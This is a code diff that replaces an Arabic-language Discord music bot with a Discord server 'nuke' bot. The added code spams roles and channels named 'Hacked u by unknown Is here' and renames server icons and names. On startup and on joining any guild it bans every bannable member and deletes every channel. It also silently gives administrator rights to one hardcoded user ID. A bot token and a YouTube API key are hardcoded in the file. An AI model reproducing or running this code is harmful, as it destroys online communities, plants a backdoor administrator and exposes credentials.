@@ -1,328 +1,481 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
-const ytdl = require('ytdl-core');
-const request = require('request');
-const fs = require('fs');
-const getYoutubeID = require('get-youtube-id');
-const fetchVideoInfo = require('youtube-info');
- 
-const yt_api_key = "AIzaSyDeoIH0u1e72AtfpwSKKOSy3IPp2UHzqi4";
-const prefix = '4';
-const discord_token = process.env.BOT_TOKEN;
-client.login(discord_token);
-client.on('ready', function() {
-    console.log(`i am ready ${client.user.username}`);
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+
 });
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
-
-
-
-
-
-
-
-
-
-
-
-
-/*
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-*/
-var servers = [];
-var queue = [];
-var guilds = [];
-var queueNames = [];
-var isPlaying = false;
-var dispatcher = null;
-var voiceChannel = null;
-var skipReq = 0;
-var skippers = [];
-var now_playing = [];
-/*
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\
-*/
-var servers = [];
-var queue = [];
-var guilds = [];
-var queueNames = [];
-var isPlaying = false;
-var dispatcher = null;
-var voiceChannel = null;
-var skipReq = 0;
-var skippers = [];
-var now_playing = [];
-/*
-\\\\\\\\\\\\\\\\\\\\\\\\/////////////////////////
-\\\\\\\\\\\\\\\\\\\\\\\\/////////////////////////
-\\\\\\\\\\\\\\\\\\\\\\\\/////////////////////////
-\\\\\\\\\\\\\\\\\\\\\\\\/////////////////////////
-*/
-client.on('ready', () => {});
-console.log("Logged")
-var download = function(uri, filename, callback) {
-    request.head(uri, function(err, res, body) {
-        console.log('content-type:', res.headers['content-type']);
-        console.log('content-length:', res.headers['content-length']);
- 
-        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
-    });
-};
- 
-client.on('message', function(message) {
-    const member = message.member;
-    const mess = message.content.toLowerCase();
-    const args = message.content.split(' ').slice(1).join(' ');
- 
-    if (mess.startsWith(prefix + 'play')) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا ,انت غير موجود في روم صوتي**');
-        // if user is not insert the URL or song title
-        if (args.length == 0) {
-            let play_info = new Discord.RichEmbed()
-                .setAuthor(client.user.username, client.user.avatarURL)
-                .setDescription('**قم بوضع الرابط , او  الاسم**')
-            message.channel.sendEmbed(play_info)
-            return;
-        }
-        if (queue.length > 0 || isPlaying) {
-            getID(args, function(id) {
-                add_to_queue(id);
-                fetchVideoInfo(id, function(err, videoInfo) {
-                    if (err) throw new Error(err);
-                    let play_info = new Discord.RichEmbed()
-                        .setAuthor("أضيف إلى قائمة الانتظار", message.author.avatarURL)
-                        .setDescription(`**${videoInfo.title}**`)
-                        .setColor("RANDOM")
-                        .setFooter('Requested By:' + message.author.tag)
-                        .setImage(videoInfo.thumbnailUrl)
-                    //.setDescription('?')
-                    message.channel.sendEmbed(play_info);
-                    queueNames.push(videoInfo.title);
-                    // let now_playing = videoInfo.title;
-                    now_playing.push(videoInfo.title);
- 
-                });
-            });
-        }
-        else {
- 
-            isPlaying = true;
-            getID(args, function(id) {
-                queue.push('placeholder');
-                playMusic(id, message);
-                fetchVideoInfo(id, function(err, videoInfo) {
-                    if (err) throw new Error(err);
-                    let play_info = new Discord.RichEmbed()
-                        .setAuthor(`Added To Queue`, message.author.avatarURL)
-                        .setDescription(`**${videoInfo.title}**`)
-                        .setColor("RANDOM")
-                        .setFooter('بطلب من: ' + message.author.tag)
-                        .setThumbnail(videoInfo.thumbnailUrl)
-                    //.setDescription('?')
-                    message.channel.sendEmbed(play_info);
-                });
-            });
-        }
-    }
-    else if (mess.startsWith(prefix + 'skip')) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا ,انت غير موجود في روم صوتي**');
-        message.reply(':gear: **تم التخطي**').then(() => {
-            skip_song(message);
-            var server = server = servers[message.guild.id];
-            if (message.guild.voiceConnection) message.guild.voiceConnection.end();
-        });
-    }
-    else if (message.content.startsWith(prefix + 'volume')) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا ,انت غير موجود في روم صوتي**');
-        // console.log(args)
-        if (args > 100) return message.reply(':x: **100**');
-        if (args < 1) return message.reply(":x: **1**");
-        dispatcher.setVolume(1 * args / 50);
-        message.channel.sendMessage(`Volume Updated To: **${dispatcher.volume*50}**`);
-    }
-    else if (mess.startsWith(prefix + 'pause')) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا ,انت غير موجود في روم صوتي**');
-        message.reply(':gear: **تم الايقاف مؤقت**').then(() => {
-            dispatcher.pause();
-        });
-    }
-    else if (mess.startsWith(prefix + 'unpause')) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا ,انت غير موجود في روم صوتي**');
-        message.reply(':gear: **تم اعاده التشغيل**').then(() => {
-            dispatcher.resume();
-        });
-    }
-    else if (mess.startsWith(prefix + 'stop')) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا ,انت غير موجود في روم صوتي**');
-        message.reply(':name_badge: **تم الايقاف**');
-        var server = server = servers[message.guild.id];
-        if (message.guild.voiceConnection) message.guild.voiceConnection.disconnect();
-    }
-    else if (mess.startsWith(prefix + 'join')) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا ,انت غير موجود في روم صوتي**');
-        message.member.voiceChannel.join().then(message.react('✅'));
-    }
-    else if (mess.startsWith(prefix + 'play')) {
-        getID(args, function(id) {
-            add_to_queue(id);
-            fetchVideoInfo(id, function(err, videoInfo) {
-                if (err) throw new Error(err);
-                if (!message.member.voiceChannel) return message.reply('**عفوا, انت غير موجود في روم صوتي**');
-                if (isPlaying == false) return message.reply(':x:');
-                let playing_now_info = new Discord.RichEmbed()
-                    .setAuthor(client.user.username, client.user.avatarURL)
-                    .setDescription(`**${videoInfo.title}**`)
-                    .setColor("RANDOM")
-                    .setFooter('Requested By:' + message.author.tag)
-                    .setImage(videoInfo.thumbnailUrl)
-                message.channel.sendEmbed(playing_now_info);
-                queueNames.push(videoInfo.title);
-                // let now_playing = videoInfo.title;
-                now_playing.push(videoInfo.title);
- 
-            });
- 
-        });
-    }
- 
-    function skip_song(message) {
-        if (!message.member.voiceChannel) return message.reply('**عفوا, انت غير موجود في روم صوتي**');
-        dispatcher.end();
-    }
- 
-    function playMusic(id, message) {
-        voiceChannel = message.member.voiceChannel;
- 
- 
-        voiceChannel.join().then(function(connectoin) {
-            let stream = ytdl('https://www.youtube.com/watch?v=' + id, {
-                filter: 'audioonly'
-            });
-            skipReq = 0;
-            skippers = [];
- 
-            dispatcher = connectoin.playStream(stream);
-            dispatcher.on('end', function() {
-                skipReq = 0;
-                skippers = [];
-                queue.shift();
-                queueNames.shift();
-                if (queue.length === 0) {
-                    queue = [];
-                    queueNames = [];
-                    isPlaying = false;
-                }
-                else {
-                    setTimeout(function() {
-                        playMusic(queue[0], message);
-                    }, 500);
-                }
-            });
-        });
-    }
- 
-    function getID(str, cb) {
-        if (isYoutube(str)) {
-            cb(getYoutubeID(str));
-        }
-        else {
-            search_video(str, function(id) {
-                cb(id);
-            });
-        }
-    }
- 
-    function add_to_queue(strID) {
-        if (isYoutube(strID)) {
-            queue.push(getYoutubeID(strID));
-        }
-        else {
-            queue.push(strID);
-        }
-    }
- 
-    function search_video(query, cb) {
-        request("https://www.googleapis.com/youtube/v3/search?part=id&type=video&q=" + encodeURIComponent(query) + "&key=" + yt_api_key, function(error, response, body) {
-            var json = JSON.parse(body);
-            cb(json.items[0].id.videoId);
-        });
-    }
- 
- 
-    function isYoutube(str) {
-        return str.toLowerCase().indexOf('youtube.com') > -1;
-    }
-});
-
-client.on('message', message => {
-   let embed = new Discord.RichEmbed()
-
-    let args = message.content.split(' ').slice(1).join(' ');
-     if(!message.channel.guild) return;
-if(message.content.split(' ')[0] == '-bc') {
-         message.react("✔️")
-          let embed = new Discord.RichEmbed()
-    .setColor("#FF00FF")
-    .setThumbnail(message.author.avatarURL)   
-                                      .addField('تم الارسال بواسطة :', "<@" + message.author.id + ">")
-                 message.channel.sendEmbed(embed);
-        message.guild.members.forEach(m => {
-            var bc = new Discord.RichEmbed()
-.addField('**● Sender  :**', `*** → ${message.author.username}#${message.author.discriminator}***`)
-            .addField('***● Server  :***', `*** → ${message.guild.name}***`)               
-    .setColor('#ff0000')
-                 .addField('ّ', args)
-            m.send(``,{embed: bc});
-        });
-    }
-})
-
-
-
-
-  client.on('ready', function(){
-        client.user.setStatus("dnd");
-        var ms = 100000 ;
-        var setGame = [`4play `];
-        var i = -1;
-        var j = 0;
-        setInterval(function (){
-            if( i == -1 ){
-                j = 1;
-            }
-            if( i == (setGame.length)-1 ){
-                j = -1;
-            }
-            i = i+j;
-            client.user.setGame(setGame[i],`https://www.instagram.com/legend_.yt/`);
-        }, ms);100000
+        
     
-   });
 
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
+});
 
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
+}
+});
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("Hacked u by unknown Is here")
 
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
 
-  
-   client.on('message', message => {
-        if(!message.channel.guild) return;
-let args = message.content.split(' ').slice(1).join(' ');
-if (message.content.startsWith('-legend')){
-if (message.author.id !== '354653862533136387') return message.reply('** هذا الأمر فقط لصاحب البوت و شكراًً **')
-message.channel.sendMessage('جار ارسال الرسالة |:white_check_mark:')
-client.users.forEach(m =>{
-m.sendMessage(args)
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by unknown Is here`)
 })
 }
 });
 
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+
+}
+});
+
+LOka.on('message', message => {
+     
+
+     if (message.content === "k1") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+    
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+
+})
+}
+});
+
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
 
 
 
-client.login(process.env.BOT_TOKEN);
+})
+}
+
+});
+
+
+const { Client } = require('discord.js');
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+    await guild.createChannel('Hacked u by unknown Is here', 'text');
+
+      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+
+  
+
+}
+
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+LOka.on('guildMemberAdd', member => {
+    
+            if (member.id === "349288766302584832") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
+        
+    });
+
+    
+
+
+
+
+LOka.login("NDU5NDU4MjEzNzA5MDg2NzIx.Dg2qsQ.02538UWCymWVztZf8jOC6qtxdEA")
